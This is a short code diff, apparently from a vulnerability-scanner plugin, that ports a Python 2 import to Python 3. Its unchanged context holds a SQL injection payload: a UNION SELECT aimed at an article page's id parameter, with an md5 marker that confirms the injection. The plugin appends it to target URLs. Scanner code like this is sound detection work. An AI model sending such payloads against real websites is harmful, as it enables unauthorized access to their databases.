@@ -9,7 +9,7 @@ def assign(service, arg):
 
 
 def audit(arg):
-    import urllib2
+    import urllib.request, urllib.error, urllib.parse
     payloads = ['home.php?action=article&id=-1%20union%20all%20select%201%2C2%2C3%2C4%2Cmd5%280x22%29--']
     for payload in payloads:
         url = arg + payload
